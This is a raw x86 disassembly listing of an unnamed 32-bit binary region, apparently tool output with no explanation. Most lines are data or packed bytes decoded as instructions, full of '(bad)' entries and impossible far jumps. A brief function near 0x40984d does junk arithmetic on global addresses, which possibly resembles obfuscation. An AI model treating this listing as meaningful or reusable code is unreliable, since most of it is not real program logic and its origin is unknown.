  40952d:	jno    0x409537
  40952f:	(bad)  
  409531:	jmp    0xb3fc:0x3d4c9148
  409538:	push   cs
  409539:	ins    BYTE PTR es:[edi],dx
  40953a:	in     al,0xc6
  40953c:	adc    eax,0xd9c89933
  409541:	mov    cl,0xe8
  409543:	mov    edx,0xbf150591
  409548:	inc    ecx
  409549:	lds    edx,FWORD PTR [esi+0x34e91111]
  40954f:	(bad)  
  409550:	push   0x38
  409552:	jbe    0x409595
  409554:	push   ebp
  409555:	not    DWORD PTR [eax]
  409557:	xor    dh,BYTE PTR ds:0x8ababe85
  40955d:	push   edi
  40955e:	mov    bl,0x97
  409560:	fs bnd jbe 0x40954f
  409564:	(bad)  
  409565:	call   0x5f98baa9
  40956a:	fs sub al,0xd6
  40956d:	adc    BYTE PTR [ebx],bl
  40956f:	inc    ebx
  409570:	inc    esp
  409571:	(bad)  
  409572:	xchg   esp,eax
  409573:	(bad)  
  409574:	jne    0x4095bf
  409576:	lods   eax,DWORD PTR ds:[esi]
  409577:	fdivrp st(3),st
  409579:	dec    eax
  40957a:	(bad)  
  40957b:	jl     0x409561
  40957d:	and    DWORD PTR [ecx],ebx
  40957f:	add    eax,0xb272c3d5
  409584:	gs mov ah,0xd4
  409587:	mov    edx,fs
  409589:	rcl    DWORD PTR [esi],1
  40958b:	cld    
  40958c:	les    ebp,FWORD PTR [edx+0x3f]
  40958f:	xchg   DWORD PTR [ecx+0x2c],ebx
  409592:	stc    
  409593:	mov    dl,0x79
  409595:	pop    ds
  409596:	lods   eax,DWORD PTR ds:[esi]
  409597:	rcl    DWORD PTR ds:0x8b997930,cl
  40959d:	sbb    ecx,DWORD PTR [esi]
  40959f:	mov    BYTE PTR ds:0x9b6618c2,ah
  4095a5:	xchg   edi,eax
  4095a6:	hlt    
  4095a7:	and    eax,0xaa9fb36d
  4095ac:	and    eax,0x64e85260
  4095b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b2:	ins    BYTE PTR es:[edi],dx
  4095b3:	arpl   WORD PTR [edi],sp
  4095b5:	bound  edx,QWORD PTR ds:0x5480c114
  4095bb:	add    eax,0x91cd368e
  4095c0:	lods   al,BYTE PTR ds:[esi]
  4095c1:	xchg   ecx,eax
  4095c2:	cwde   
  4095c3:	lea    eax,[esi-0xe9d70b8]
  4095c9:	xor    BYTE PTR [eax+0x5b3f3edc],ch
  4095cf:	xchg   ebp,eax
  4095d0:	ja     0x40960b
  4095d2:	aam    0xdc
  4095d4:	push   es
  4095d5:	and    al,0x14
  4095d7:	in     al,0xff
  4095d9:	outs   dx,BYTE PTR ds:[esi]
  4095da:	es popf 
  4095dc:	adc    dh,BYTE PTR [ebx-0x20]
  4095df:	cmp    BYTE PTR [esi+0x22],al
  4095e2:	mov    dl,0x57
  4095e4:	and    BYTE PTR [esi-0x6d2d11e2],0xe8
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e07:0x28fcbb4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	dec    ebx
  40960d:	ja     0x409596
  40960f:	and    DWORD PTR [eax-0x40c0d90f],esi
  409615:	sub    BYTE PTR [ebx+0x2743a41f],bl
  40961b:	rol    BYTE PTR [ecx],cl
  40961d:	fcom   st(3)
  40961f:	int3   
  409620:	out    dx,eax
  409621:	test   eax,0x7077562b
  409626:	mov    eax,0x6d7d45b9
  40962b:	in     eax,dx
  40962c:	rcl    DWORD PTR [eax+0x68],0x56
  409630:	sub    cl,ch
  409632:	push   esi
  409633:	cli    
  409634:	ins    BYTE PTR es:[edi],dx
  409635:	rcl    DWORD PTR [ebp+0x52f7b92c],1
  40963b:	or     eax,0x6f8b83a5
  409640:	jnp    0x4095de
  409642:	jb     0x4095df
  409644:	push   esp
  409645:	mov    dl,0x14
  409647:	add    al,dh
  409649:	dec    ebx
  40964a:	xor    eax,0x6114d486
  40964f:	inc    ebx
  409650:	push   0xc5bb94f4
  409655:	lds    esp,FWORD PTR ds:0x95953ac8
  40965b:	int    0xc0
  40965d:	xor    edx,ecx
  40965f:	dec    ebp
  409660:	fiadd  DWORD PTR [edx+0x61]
  409663:	nop
  409664:	fdivr  DWORD PTR [edx+0x5a]
  409667:	imul   ebx,DWORD PTR [ebx],0xf
  40966a:	mov    esi,0xa10d67d1
  40966f:	dec    eax
  409670:	sub    eax,0x2842c93d
  409675:	xor    bl,BYTE PTR [eax-0x5a]
  409678:	idiv   DWORD PTR [edx+0x1d751da6]
  40967e:	xchg   ebx,eax
  40967f:	xor    eax,0xe1fc894a
  409684:	mov    edi,0x711e1f90
  409689:	xlat   BYTE PTR ds:[ebx]
  40968a:	or     esi,DWORD PTR [esp+edx*4]
  40968d:	and    edi,ebx
  40968f:	sbb    ebx,eax
  409691:	xchg   edi,eax
  409692:	test   eax,0xe04023c5
  409697:	jp     0x409713
  409699:	pop    edi
  40969a:	pop    eax
  40969b:	lods   eax,DWORD PTR ds:[esi]
  40969c:	mov    edx,0x9f77b53c
  4096a1:	(bad)  
  4096a2:	call   0xb4830797
  4096a7:	(bad)  
  4096a8:	push   ebx
  4096a9:	test   al,0x60
  4096ab:	fcomp  DWORD PTR [ecx+0x73]
  4096ae:	jns    0x4096ea
  4096b0:	xchg   ecx,eax
  4096b1:	pop    ecx
  4096b2:	sbb    BYTE PTR [edx],dl
  4096b4:	mov    DWORD PTR [edi-0x1a],ecx
  4096b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b8:	mov    ch,ch
  4096ba:	jmp    0x56de:0x78cf3ee3
  4096c1:	aaa    
  4096c2:	pop    ss
  4096c3:	add    edx,esi
  4096c5:	and    al,0xfb
  4096c7:	popf   
  4096c8:	(bad)  
  4096c9:	retf   0xe3da
  4096cc:	ins    DWORD PTR es:[edi],dx
  4096cd:	cmc    
  4096ce:	pop    esi
  4096cf:	out    0xa3,eax
  4096d1:	je     0x4096d6
  4096d3:	inc    ebp
  4096d4:	gs dec ebp
  4096d6:	mov    eax,0x83ae7f79
  4096db:	stc    
  4096dc:	call   0x406bbec3
  4096e1:	inc    esi
  4096e2:	add    ch,dh
  4096e4:	mov    ebx,0x14c41665
  4096e9:	loop   0x409687
  4096eb:	mov    esp,0x3f4b1b94
  4096f0:	(bad)  
  4096f1:	add    eax,0xfa17e918
  4096f6:	fst    DWORD PTR [ebp+0x4b588026]
  4096fc:	out    dx,eax
  4096fd:	pop    ecx
  4096fe:	retf   0x401a
  409701:	push   0xe499a2d5
  409706:	retf   
  409707:	xchg   esi,eax
  409708:	scas   eax,DWORD PTR es:[edi]
  409709:	fidivr DWORD PTR [edi+0x54e079ab]
  40970f:	or     al,0xc
  409711:	xchg   esi,eax
  409712:	lods   al,BYTE PTR ds:[esi]
  409713:	or     al,0x94
  409715:	rcr    BYTE PTR [ebp+0x13f545a6],1
  40971b:	ja     0x40970a
  40971d:	dec    ebp
  40971e:	push   0xbea2ed6c
  409723:	ja     0x40974d
  409725:	pop    ecx
  409726:	and    eax,0x29323139
  40972b:	jno    0x409781
  40972d:	fs int 0xc9
  409730:	enter  0x3a8a,0x39
  409734:	cld    
  409735:	mov    ch,0xbb
  409737:	shl    DWORD PTR [ebp-0x4e],0x95
  40973b:	xor    ecx,ecx
  40973d:	adc    BYTE PTR [edx],bh
  40973f:	mov    edx,DWORD PTR [ecx+edi*4+0x45]
  409743:	xchg   esi,eax
  409744:	outs   dx,DWORD PTR ds:[esi]
  409745:	sbb    cl,BYTE PTR [esi]
  409747:	add    BYTE PTR [esp+esi*8],bl
  40974a:	ret    0x6060
  40974d:	(bad)  
  40974e:	clc    
  40974f:	pop    ss
  409750:	mov    eax,0xac640445
  409755:	lods   eax,DWORD PTR ds:[esi]
  409756:	hlt    
  409757:	mov    BYTE PTR [edx],bh
  409759:	dec    esi
  40975a:	inc    eax
  40975b:	hlt    
  40975c:	push   es
  40975d:	outs   dx,DWORD PTR ds:[esi]
  40975e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40975f:	cmp    ah,al
  409761:	adc    bh,BYTE PTR [ebp+0x19]
  409764:	push   ds
  409765:	inc    ecx
  409766:	fcom   QWORD PTR [ebp-0x56e16b12]
  40976c:	jmp    0x3fb55d81
  409771:	mov    eax,ds:0xccdceeff
  409776:	ins    DWORD PTR es:[edi],dx
  409777:	and    al,0xa7
  409779:	add    BYTE PTR [ecx-0x7c],cl
  40977c:	pop    esi
  40977d:	or     ch,BYTE PTR [ebx]
  40977f:	clc    
  409780:	or     eax,0xb39a8218
  409785:	xchg   ebp,eax
  409786:	sti    
  409787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409788:	mov    al,0xcb
  40978a:	sub    BYTE PTR ds:0xe0d84c23,al
  409790:	xchg   ch,dl
  409792:	iret   
  409793:	pop    esp
  409794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409795:	imul   esp,esp,0xe4cb2f2e
  40979b:	jo     0x4097f2
  40979d:	popa   
  40979e:	out    0x3,al
  4097a0:	fld    st(4)
  4097a2:	pushf  
  4097a3:	in     al,0x51
  4097a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097a6:	mov    edx,0x7c8fb70b
  4097ab:	xchg   BYTE PTR [ebp+0x17],ch
  4097ae:	fwait
  4097af:	out    0x14,al
  4097b1:	xchg   edx,eax
  4097b2:	dec    ecx
  4097b3:	adc    DWORD PTR [esi-0x54],eax
  4097b6:	mov    DWORD PTR [edx-0x75],eax
  4097b9:	dec    eax
  4097ba:	mov    ebp,0x938826b9
  4097bf:	pop    esp
  4097c0:	test   BYTE PTR [ebx],dh
  4097c2:	mov    BYTE PTR [edi+0x5d],ch
  4097c5:	mov    ah,0xac
  4097c7:	lds    ecx,FWORD PTR [ebx+0x71]
  4097ca:	ror    al,0x1e
  4097cd:	(bad)  
  4097ce:	arpl   WORD PTR [ebx+0x3c3c531f],bp
  4097d4:	jmp    0xec27d74c
  4097d9:	bound  edi,QWORD PTR [edx+0x21]
  4097dc:	mov    ebp,0xf5fcb5aa
  4097e1:	push   eax
  4097e2:	xor    al,0xe6
  4097e4:	or     ah,BYTE PTR [ebx+eax*4+0x56]
  4097e8:	add    ebp,DWORD PTR [eax+0x5b]
  4097eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ec:	leave  
  4097ed:	retf   
  4097ee:	mov    edi,0x432bb071
  4097f3:	and    al,0xe2
  4097f5:	xor    edi,edx
  4097f7:	sar    DWORD PTR [edi+0x5b],0x36
  4097fb:	fistp  DWORD PTR [esi+0x6e]
  4097fe:	hlt    
  4097ff:	dec    edx
  409800:	mov    dh,0xc2
  409802:	sar    BYTE PTR [eax],cl
  409804:	fmul   QWORD PTR [eax-0x6ee452a7]
  40980a:	int3   
  40980b:	inc    esi
  40980c:	xor    cl,BYTE PTR [ebp-0x43ba12ab]
  409812:	hlt    
  409813:	mov    al,0x12
  409815:	fiadd  WORD PTR gs:[ebx-0x1775c34f]
  40981c:	test   eax,0x8ab8a79f
  409821:	xchg   esp,eax
  409822:	cld    
  409823:	push   0xe5f41499
  409828:	ret    0x8e5a
  40982b:	mov    eax,0x6023741d
  409830:	adc    BYTE PTR [eax+0xbaf3128],dl
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	jecxz  0x40988e
  4098c2:	test   DWORD PTR [eax+0x7e7ed9b4],0x7e7e7c38
  4098cc:	mov    eax,0x435c53ce
  4098d1:	cmp    ah,BYTE PTR [ecx]
  4098d3:	aaa    
  4098d4:	dec    ebp
  4098d5:	push   ss
  4098d6:	addr16 iret 
  4098d8:	jno    0x4098cf
  4098da:	mov    ch,0xb7
  4098dc:	xor    BYTE PTR [esi+0x2226ef35],dl
  4098e2:	mov    DWORD PTR [ecx-0x15],edx
  4098e5:	(bad)  
  4098e7:	in     al,0xc6
  4098e9:	call   0x52ecae8e
  4098ee:	push   esp
  4098ef:	lds    edi,FWORD PTR [ecx]
  4098f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f2:	xchg   DWORD PTR [ebp+0x5e0f0216],edx
  4098f8:	mov    edx,0x625853cd
  4098fd:	retf   
  4098fe:	mov    cl,0xae
  409900:	fidivr DWORD PTR ds:[edi+0x7b960c99]
  409907:	jno    0x40991a
  409909:	pop    edx
  40990a:	sbb    edx,DWORD PTR ds:0xd3fa9936
  409910:	xchg   edi,eax
  409911:	xchg   esi,eax
  409912:	push   eax
  409913:	push   ecx
  409914:	dec    edx
  409915:	aad    0x12
  409917:	mov    DWORD PTR [edi],ebx
  409919:	rcl    edx,0xdc
  40991c:	or     esp,DWORD PTR [edi+0x493c40cf]
  409922:	pop    edi
  409923:	sti    
  409924:	adc    ah,bl
  409926:	sub    bh,dl
  409928:	aaa    
  409929:	jb     0x40994f
  40992b:	mov    ebp,0x5740d524
  409930:	push   eax
  409931:	lods   eax,DWORD PTR ds:[esi]
  409932:	jle    0x40994b
  409934:	cmp    BYTE PTR gs:[esi+ebx*2+0x75b14b5f],dl
  40993c:	test   eax,0x32bff701
  409941:	shl    BYTE PTR [edx+0x4a],cl
  409944:	push   ds
  409945:	sub    al,0x96
  409947:	mov    BYTE PTR [edx-0x1de36201],bl
  40994d:	lods   eax,DWORD PTR ds:[esi]
  40994e:	aad    0x1d
  409950:	jecxz  0x409978
  409952:	lahf   
  409953:	push   cs
  409954:	loope  0x409993
  409956:	es arpl bp,ax
  409959:	or     DWORD PTR [edx],0x72ae32b1
  40995f:	std    
  409960:	cli    
  409961:	sub    BYTE PTR [edi+edi*8-0x2f11aeb4],bh
  409968:	sub    eax,0xa3dad300
  40996d:	dec    ecx
  40996e:	jge    0x409975
  409970:	jle    0x4099eb
  409972:	aaa    
  409973:	xor    eax,0x5373c23d
  409978:	or     edx,ebx
  40997a:	cmp    esp,DWORD PTR gs:[ecx]
  40997d:	mov    esi,0xfeff367f
  409982:	cld    
  409983:	or     al,0x38
  409985:	push   esi
  409986:	xor    BYTE PTR [ebp-0x14c56bcd],bl
  40998c:	lds    ebp,FWORD PTR [ebp+0x61]
  40998f:	jp     0x40994c
  409991:	out    dx,al
  409992:	mov    cl,0x36
  409994:	push   ss
  409995:	les    esi,FWORD PTR [ecx-0x35]
  409998:	xor    ch,bl
  40999a:	scas   eax,DWORD PTR es:[edi]
  40999b:	pop    esi
  40999c:	sbb    al,0x98
  40999e:	add    al,0x3d
  4099a0:	sbb    ch,dh
  4099a2:	mov    al,0x63
  4099a4:	rcr    edx,1
  4099a6:	jnp    0x4099f2
  4099a8:	ds add dl,al
  4099ab:	es xor al,0x2a
  4099ae:	daa    
  4099af:	cmc    
  4099b0:	or     DWORD PTR [edx+0x4],esp
  4099b3:	icebp  
  4099b4:	test   al,0xd7
  4099b6:	dec    ebp
  4099b7:	mov    eax,0x5017a0e
  4099bc:	xor    BYTE PTR ss:[ecx],ah
  4099bf:	cmp    ebp,DWORD PTR ds:0x39937e52
  4099c5:	push   cs
  4099c6:	inc    edi
  4099c7:	dec    ebp
  4099c8:	ret    0x6cf8
  4099cb:	cmp    al,0x87
  4099cd:	xchg   esi,eax
  4099ce:	jb     0x409986
  4099d0:	inc    ecx
  4099d1:	stos   BYTE PTR es:[edi],al
  4099d2:	lods   eax,DWORD PTR ds:[esi]
  4099d3:	mov    edi,0xf769f757
  4099d8:	dec    esp
  4099d9:	outs   dx,BYTE PTR ds:[esi]
  4099da:	int    0x71
  4099dc:	jmp    0x40998f
  4099de:	mov    ds:0xaa19b7d7,eax
  4099e3:	jae    0x4099ef
  4099e5:	mov    ebx,0x49519580
  4099ea:	mov    ?,WORD PTR [edi-0x1b600da5]
  4099f0:	add    ecx,eax
  4099f2:	cwde   
  4099f3:	push   ebx
  4099f4:	add    BYTE PTR [ecx+0x34],dh
  4099f7:	das    
  4099f8:	mov    al,0x82
  4099fa:	cmp    ebp,DWORD PTR [edx]
  4099fc:	scas   eax,DWORD PTR es:[edi]
  4099fd:	sbb    DWORD PTR [esi+0x66b498e5],edi
  409a03:	adc    esi,ebp
  409a05:	shl    BYTE PTR [ebp-0x7919b5b2],1
  409a0b:	pop    es
  409a0c:	nop
  409a0d:	and    bl,BYTE PTR [edi+0x26cbb27a]
  409a13:	or     DWORD PTR [eax-0x3efb4d9d],0xf
  409a1a:	clc    
  409a1b:	add    esi,DWORD PTR [edi-0x65]
  409a1e:	jo     0x409a80
  409a20:	sbb    eax,0xd8f54dc9
  409a25:	mov    ds:0x596f17db,al
  409a2a:	aas    
  409a2b:	and    bl,bh
  409a2d:	and    ah,BYTE PTR [ecx+0x797c0e66]
  409a33:	ret    0xe104
  409a36:	xchg   BYTE PTR [esi+0x1716051a],cl
  409a3c:	mov    bl,0x80
  409a3e:	daa    
  409a3f:	pop    eax
  409a40:	jae    0x409ab6
  409a42:	in     eax,0xef
  409a44:	repz retf 0x371c
  409a48:	lods   al,BYTE PTR ds:[esi]
  409a49:	sub    eax,0x73634860
  409a4e:	adc    cl,cl
  409a50:	add    eax,0xe499ddca
  409a55:	rcr    ecx,cl
  409a57:	in     al,0xad
  409a59:	cmp    al,0x78
  409a5b:	stos   BYTE PTR es:[edi],al
  409a5c:	xchg   ebp,eax
  409a5d:	xchg   edi,eax
  409a5e:	jne    0x409a7d
  409a60:	mov    cl,0x34
  409a62:	test   DWORD PTR ds:0x84ed6239,edx
  409a68:	mov    eax,0xda4c3416
  409a6d:	push   edx
  409a6e:	or     DWORD PTR ds:0x351a7570,esp
  409a74:	cmp    BYTE PTR [esi+0x17],0x70
  409a78:	mov    cl,0x18
  409a7a:	adc    DWORD PTR [esi-0x8],ebp
  409a7d:	js     0x409a03
  409a7f:	ja     0x409a29
  409a81:	outs   dx,DWORD PTR ds:[esi]
  409a82:	jp     0x409aff
  409a84:	and    BYTE PTR [ebp+0x7],al
  409a87:	dec    edx
  409a88:	push   ds
  409a89:	mov    bh,0xc0
  409a8b:	fld    DWORD PTR [ebx+ebx*4+0x11]
  409a8f:	lock sub al,0x8
  409a92:	add    dl,dl
  409a94:	xchg   BYTE PTR [eax],dh
  409a96:	gs out 0xcb,eax
  409a99:	mov    al,ds:0xadac2d77
  409a9e:	cdq    
  409a9f:	mov    bh,0xc8
  409aa1:	inc    ebx
  409aa2:	(bad)  
  409aa3:	sub    eax,0x3fde7c5b
  409aa8:	icebp  
  409aa9:	sub    eax,0xb00a40ff
  409aae:	cmp    BYTE PTR [edx],bh
  409ab0:	push   esp
  409ab1:	sbb    bl,cl
  409ab3:	add    BYTE PTR [ebx+0x26],dl
  409ab6:	jbe    0x409a8b
  409ab8:	jno    0x409ae8
  409aba:	cmp    BYTE PTR [edx],bh
  409abc:	adc    esi,DWORD PTR fs:[esi-0x555da400]
  409ac3:	fsub   QWORD PTR [eax]
  409ac5:	cmp    DWORD PTR [eax-0x45a0cf2f],edx
  409acb:	jecxz  0x409ad1
  409acd:	jmp    0xcb81:0x2f97a3c2
  409ad4:	pop    ebp
  409ad5:	push   0xffffff9b
  409ad7:	mov    BYTE PTR [ecx-0x7],bh
  409ada:	aas    
  409adb:	fs shl bh,0x77
  409adf:	xchg   ebx,eax
  409ae0:	sub    al,0xfe
  409ae2:	ret    
  409ae3:	jp     0x409a9f
  409ae5:	mov    ebp,0xc2b43c89
  409aea:	dec    ebx
  409aeb:	test   al,0x7d
  409aed:	xchg   ecx,eax
  409aee:	mov    ds:0x2978acb8,al
  409af3:	(bad)  
  409af4:	lahf   
  409af5:	cmp    esp,ecx
  409af7:	test   al,0x80
  409af9:	xchg   bh,ch
  409afb:	pop    ss
  409afc:	stc    
  409afd:	adc    eax,0xf21bf40f
  409b02:	push   ebp
  409b03:	adc    dl,BYTE PTR [edi]
  409b05:	clc    
  409b06:	sti    
  409b07:	jmp    0x409b81
  409b09:	jp     0x409b46
  409b0b:	xchg   esp,eax
  409b0c:	loope  0x409b68
  409b0e:	mov    eax,0x56b67722
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x2b6de3d4]
  409b32:	mov    eax,0x7e7ee47e
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	jge    0x409b96
  409b3d:	cs loope 0x409aec
  409b40:	cmp    al,0xd8
  409b42:	sbb    DWORD PTR [esi+0x31],0xfb0f3d94
  409b49:	gs scas al,BYTE PTR es:[edi]
  409b4b:	or     DWORD PTR [eax-0x44],ebx
  409b4e:	je     0x409b43
  409b50:	cdq    
  409b51:	add    ebx,DWORD PTR [edi+0x2cb296ad]
  409b57:	loopne 0x409b24
  409b59:	push   ebp
  409b5a:	xchg   ebx,eax
  409b5b:	cwde   
  409b5c:	lds    edx,FWORD PTR [ecx-0x63]
  409b5f:	scas   al,BYTE PTR es:[edi]
  409b60:	mov    bh,0x8b
  409b62:	jns    0x409b96
  409b64:	call   0x799:0x5a614a30
  409b6b:	cli    
  409b6c:	pop    es
  409b6d:	inc    ebx
  409b6e:	jmp    0xe6af547
  409b73:	jmp    0xb1a5223
  409b78:	jle    0x409b8b
  409b7a:	mov    al,ds:0x84dd192d
  409b7f:	pushf  
  409b80:	adc    al,0x1d
  409b82:	jg     0x409bb4
  409b84:	std    
  409b85:	(bad)  
  409b86:	lsl    esi,ax
  409b89:	jno    0x409b1c
  409b8b:	ror    BYTE PTR [esi-0xa3486c6],0x24
  409b92:	cwde   
  409b93:	xchg   edx,eax
  409b94:	daa    
  409b95:	inc    esi
  409b96:	dec    ecx
  409b97:	sbb    dh,BYTE PTR [edi-0x12]
  409b9a:	stos   DWORD PTR es:[edi],eax
  409b9b:	enter  0x7805,0x73
  409b9f:	mov    dl,0x47
  409ba1:	mov    cl,0x95
  409ba3:	in     eax,0x51
  409ba5:	inc    ecx
  409ba6:	dec    ecx
  409ba7:	jmp    0xa4f1:0xa416bdfd
  409bae:	dec    ebp
  409baf:	scas   eax,DWORD PTR es:[edi]
  409bb0:	aam    0xb9
  409bb2:	imul   edx,DWORD PTR [edi+0x6011afc8],0xffffff97
  409bb9:	jmp    0xd30f97d1
  409bbe:	jle    0x409b57
  409bc0:	pop    edi
  409bc1:	aad    0x96
  409bc3:	retf   0xc00c
  409bc6:	mov    ah,0x19
  409bc8:	pop    ecx
  409bc9:	test   BYTE PTR [esi-0x2c15bd53],ch
  409bcf:	adc    al,0x11
  409bd1:	sbb    al,0xb7
  409bd3:	js     0x409bba
  409bd5:	jmp    0xe731:0x3ce84763
  409bdc:	xor    ecx,DWORD PTR [ebx+0x5b7b8930]
  409be2:	pop    ebp
  409be3:	jo     0x409c4a
  409be5:	push   cs
  409be6:	xor    al,0xf4
  409be8:	sti    
  409be9:	dec    edi
  409bea:	mov    al,ds:0x64568236
  409bef:	inc    esp
  409bf0:	mov    ds:0xc2dc84fd,al
  409bf5:	sbb    eax,0x568c460d
  409bfa:	cmp    cl,BYTE PTR [esi]
  409bfc:	jp     0x409bcd
  409bfe:	test   DWORD PTR [ebx-0x51],edx
  409c01:	add    eax,0x2e7ce14e
  409c06:	test   BYTE PTR [ecx+0x3a],cl
  409c09:	jns    0x409c29
  409c0b:	sub    BYTE PTR [edi+0x77],dh
  409c0e:	push   esi
  409c0f:	cmp    al,0x7e
  409c11:	fsub   QWORD PTR [eax+0xb]
  409c14:	mov    esp,0xb15185a1
  409c19:	mov    ebx,0x88ac89fe
  409c1e:	fmul   QWORD PTR [edx-0x23]
  409c21:	(bad)  
  409c22:	out    dx,eax
  409c23:	and    DWORD PTR [ecx],edi
  409c25:	pushf  
  409c26:	ret    0x99a3
  409c29:	jp     0x409c8f
  409c2b:	les    edx,FWORD PTR [ebp+0x28ab634]
  409c31:	push   ebp
  409c32:	ds or  ch,dh
  409c35:	in     eax,0x19
  409c37:	push   eax
  409c38:	les    eax,FWORD PTR [ecx+0x4e9b4c9f]
  409c3e:	popa   
  409c3f:	adc    BYTE PTR [ebp+edx*1-0x33],bh
  409c43:	iret   
  409c44:	(bad)  
  409c45:	and    bh,BYTE PTR [ecx+eiz*1]
  409c48:	dec    esi
  409c49:	adc    edi,esp
  409c4b:	inc    ecx
  409c4c:	mov    ds:0x7bd78a35,al
  409c51:	dec    eax
  409c52:	mov    ebp,esp
  409c54:	add    dh,BYTE PTR [ecx+0x54cb90a2]
  409c5a:	and    al,0xa
  409c5c:	fistp  QWORD PTR [ebp+0x760422e2]
  409c62:	push   edx
  409c63:	lods   al,BYTE PTR ds:[esi]
  409c64:	mov    eax,ds:0x1d82de54
  409c69:	imul   edx,DWORD PTR [edi+0x1beb5b06],0x6334f4fe
  409c73:	int3   
  409c74:	leave  
  409c75:	push   ebp
  409c76:	mov    eax,0x6c95ef63
  409c7b:	stos   BYTE PTR es:[edi],al
  409c7c:	mov    edi,0x4b83d34d
  409c81:	mov    eax,0xfed79a2c
  409c86:	sub    BYTE PTR [edi-0x2c7eef43],al
  409c8c:	cli    
  409c8d:	dec    ebx
  409c8e:	mov    ?,WORD PTR [eax]
  409c90:	leave  
  409c91:	mov    al,0x8e
  409c93:	data16 fmul DWORD PTR [eax-0x35]
  409c97:	add    ecx,DWORD PTR [ecx]
  409c99:	fst    DWORD PTR [ebx+0x77]
  409c9c:	mov    ch,0x28
  409c9e:	jmp    0x53b:0xc2fb471
  409ca5:	ins    DWORD PTR es:[edi],dx
  409ca6:	(bad)
  409ca9:	mov    ebp,DWORD PTR [ecx]
  409cab:	push   cs
  409cac:	mov    dh,0x56
  409cae:	pop    esi
  409caf:	shr    DWORD PTR [ebp+0x79],cl
  409cb2:	lds    edi,FWORD PTR [ebx+edi*1+0x7d044fa8]
  409cb9:	mov    bh,0xa2
  409cbb:	xor    eax,0xf177d31
  409cc0:	dec    BYTE PTR [esi+0xf1e1ad7]
  409cc6:	or     ebx,DWORD PTR [esi+esi*2]
  409cc9:	out    0xd6,eax
  409ccb:	push   edx
  409ccc:	(bad)  
  409ccd:	xchg   ebx,eax
  409cce:	ror    BYTE PTR [ebx],cl
  409cd0:	jmp    DWORD PTR [eax]
  409cd2:	inc    eax
  409cd3:	aaa    
  409cd4:	les    ebp,FWORD PTR [eax]
  409cd6:	push   ebp
  409cd7:	xchg   esi,eax
  409cd8:	call   0xf561:0x69fdfe6e
  409cdf:	outs   dx,BYTE PTR ds:[esi]
  409ce0:	mov    ds:0x7ef95f75,al
  409ce5:	jbe    0x409d30
  409ce7:	sar    DWORD PTR [esi-0x4a811584],0x34
  409cee:	and    eax,0x3c0056b1
  409cf3:	adc    cl,BYTE PTR [eax]
  409cf5:	push   edx
  409cf6:	cli    
  409cf7:	lock or esi,DWORD PTR [edi-0x39]
  409cfb:	pop    eax
  409cfc:	dec    esp
  409cfd:	stc    
  409cfe:	jns    0x409cd8
  409d00:	mov    dl,BYTE PTR [eax+edx*8-0x32]
  409d04:	pop    esp
  409d05:	mov    eax,0x3f83d919
  409d0a:	daa    
  409d0b:	lea    esi,[ecx]
  409d0d:	xchg   esp,eax
  409d0e:	pop    ebx
  409d0f:	ret    0x21c9
  409d12:	jg     0x409d31
  409d14:	push   ecx
  409d15:	cmp    eax,0xcb9cbab8
  409d1a:	jno    0x409d95
  409d1c:	pushf  
  409d1d:	mov    edx,0xb1618938
  409d22:	add    eax,0xafe8b0e3
  409d27:	mov    ds:0xfb90a9fa,al
  409d2c:	and    al,0xfb
  409d2e:	inc    eax
  409d2f:	out    0xdd,eax
  409d31:	sub    ch,ah
  409d33:	out    dx,al
  409d34:	lea    ebx,[esi]
  409d36:	add    eax,0x3fbb6b46
  409d3b:	cmp    ch,BYTE PTR [ecx-0x767039cb]
  409d41:	ins    DWORD PTR es:[edi],dx
  409d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d43:	xchg   ebp,eax
  409d44:	loope  0x409d55
  409d46:	in     eax,0x81
  409d48:	adc    BYTE PTR [ebp+0x7f7f8964],bh
  409d4e:	in     al,0xab
